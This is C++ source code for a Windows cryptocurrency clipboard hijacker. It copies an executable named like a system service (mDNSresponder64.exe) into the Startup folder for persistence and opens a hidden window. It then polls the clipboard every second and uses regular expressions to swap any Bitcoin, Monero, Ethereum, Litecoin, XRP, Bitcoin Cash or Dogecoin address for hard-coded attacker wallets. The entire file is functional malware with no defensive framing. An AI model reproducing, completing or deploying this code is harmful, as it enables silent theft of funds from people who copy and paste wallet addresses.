#include <Windows.h>
#include <iostream>
#include <regex>
#include <vector>
#include <thread>

// Function to copy the executable to the startup folder
void CopyToStartupFolder(const std::string& exePath) {
    std::wstring startupFolderPath = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
    std::wstring destinationPath = startupFolderPath + L"\\" + std::wstring(exePath.begin(), exePath.end());
    CopyFileW(LPCWSTR(exePath.c_str()), destinationPath.c_str(), FALSE);
}


// Renamed function to avoid conflict with the one in winuser.h
bool IsClipboardFormatAvailableCustom(UINT format)
{
    return ::IsClipboardFormatAvailable(format) != 0;
}

// Function to retrieve text from the clipboard
std::string GetClipboardText()
{
    std::string text;
    if (OpenClipboard(nullptr))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData != nullptr)
        {
            char *pszText = static_cast<char *>(GlobalLock(hData));
            if (pszText != nullptr)
            {
                text = pszText;
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
    return text;
}

// Function to set text to the clipboard
void SetClipboardText(const std::string &text)
{
    if (OpenClipboard(nullptr))
    {
        EmptyClipboard();
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
        if (hMem != nullptr)
        {
            char *pszText = static_cast<char *>(GlobalLock(hMem));
            if (pszText != nullptr)
            {
                // Replaced strcpy_s with strcpy
                strcpy(pszText, text.c_str());
                GlobalUnlock(hMem);
                SetClipboardData(CF_TEXT, hMem);
            }
        }
        CloseClipboard();
    }
}

int main()
{
    // Path to your executable
    std::string exePath = "C:\\temp\\mDNSresponder64.exe";

    // Copy the executable to the startup folder
    CopyToStartupFolder(exePath);

    // hidden window
    HWND hwnd = CreateWindowA("STATIC", "invisible window", WS_OVERLAPPEDWINDOW,
                              CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                              CW_USEDEFAULT, nullptr, nullptr,
                              GetModuleHandle(nullptr), nullptr);
    ShowWindow(hwnd, SW_HIDE);
    // Define multiple regex patterns
    std::vector<std::pair<std::regex, std::string>> regex_patterns = {

        {std::regex(R"(\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b)"), "bc1q5vgyfh6zcjd80nlzkkdsc97vvv33wl53l4a9kf"},
        {std::regex(R"(\b4[0-9A-Za-z]{94}\b)"), "84nCb2Jq9H1GwTXa2716GdV4dNUtdxz3Wet69YCy9FUPjjnjMvTBq53ZqE6ZpUDQYq4H3wXNNvGV5Ddh9FLDRhpi2WWWBKo"},
        {std::regex(R"(\b8[0-9A-Za-z]{94}\b)"), "84nCb2Jq9H1GwTXa2716GdV4dNUtdxz3Wet69YCy9FUPjjnjMvTBq53ZqE6ZpUDQYq4H3wXNNvGV5Ddh9FLDRhpi2WWWBKo"},
        {std::regex(R"(\b0x[a-fA-F0-9]{40}\b)"), "0xf75680937f4aa02a7d6a453e8d98eb1fcd964e4f"},
        {std::regex(R"(\b([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})\b)"), "LSpAKaVJP3ztFrwsRH4fN5HE5smHzv6uYm"},
        {std::regex(R"(\b[rR][a-km-zA-HJ-NP-Z1-9]{24,34}\b)"), "rHcXrn8joXL2Qe7BaMnhB5VRuj1XKEmUW6"},
        {std::regex(R"(\b(1[0-9a-km-zA-HJ-NP-Z]{25,34})\b)"), "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"},
        {std::regex(R"(\b((bitcoincash:)?(q|p)[a-z0-9]{41})\b)"), "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"},
        {std::regex(R"(\b([qpzry9x8gf2tvdw0s3jn54khce6mua7l]{42})\b)"), "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"},
        {std::regex(R"(\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{25,39})\b)"), "bc1q5vgyfh6zcjd80nlzkkdsc97vvv33wl53l4a9kf"},
        {std::regex(R"(\b(D[a-km-zA-HJ-NP-Z1-9]{25,34}|9[a-km-zA-HJ-NP-Z1-9]{25,34})\b)"), "DCu4KDPTFzpujLKBszd4KCnZFxUfm1GcoR"},
        

        // Add more regex patterns as needed
    };

    // Loop to continuously monitor the clipboard
    while (true)
    {
        // Check if text is available in the clipboard
        if (IsClipboardFormatAvailableCustom(CF_TEXT))
        {
            // Retrieve text from the clipboard
            std::string clipboard_text = GetClipboardText();
            // std::cout << "Original clipboard text: " << clipboard_text << std::endl; // Debugging statement
 
            // Perform regex replacement for each pattern
            for (const auto &pattern : regex_patterns)
            {
                clipboard_text = std::regex_replace(clipboard_text, pattern.first, pattern.second);
            }

            // std::cout << "Modified clipboard text: " << clipboard_text << std::endl; // Debugging statement

            // Set the modified text back to the clipboard
            SetClipboardText(clipboard_text);
        }

        // Pause for a short interval before checking the clipboard again
        Sleep(1000); // Sleep for 1 second
    }

    return 0;
}